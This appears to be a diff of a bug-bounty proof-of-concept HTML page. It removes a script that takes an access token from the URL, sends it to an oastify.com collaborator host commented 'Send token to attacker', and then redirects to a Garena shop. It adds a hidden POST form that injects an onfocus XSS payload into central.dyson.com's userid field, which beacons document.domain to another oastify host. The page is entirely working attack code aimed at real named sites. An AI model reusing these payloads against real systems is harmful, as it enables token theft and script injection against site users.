@@ -1,18 +1,13 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h2>Redirecting...</h2>
-    <script>
-      const token = new URLSearchParams(window.location.search).get("access_token");
-      if (token) {
-        // Send token to attacker
-        fetch("https://bs74d5yb2cg675qae9w7n3ae85ew2vqk.oastify.com/leak?token=" + encodeURIComponent(token));
-      }
+    <h3>Click the button to trigger XSS on central.dyson.com</h3>
 
-      // Then redirect to the real Garena URL (with or without token)
-      setTimeout(() => {
-        window.location.href = "https://shop.garena.sg/?utm_source=FF+RedeemPage&utm_medium=Entrance";
-      }, 2000); // Wait 2 seconds to make sure the token is sent
-    </script>
+    <form action="https://central.dyson.com/" method="POST" target="_blank">
+      <input type="hidden" name="userid" value='" autofocus onfocus="new Image().src=`http://6z6vxzx4idg02p3cpxr8q9btjkpcda1z.oastify.com?d=`+document.domain">
+      <input type="hidden" name="password" value="x">
+      <input type="hidden" name="mode" value="Login">
+      <button type="submit">Click me to login</button>
+    </form>
   </body>
 </html>
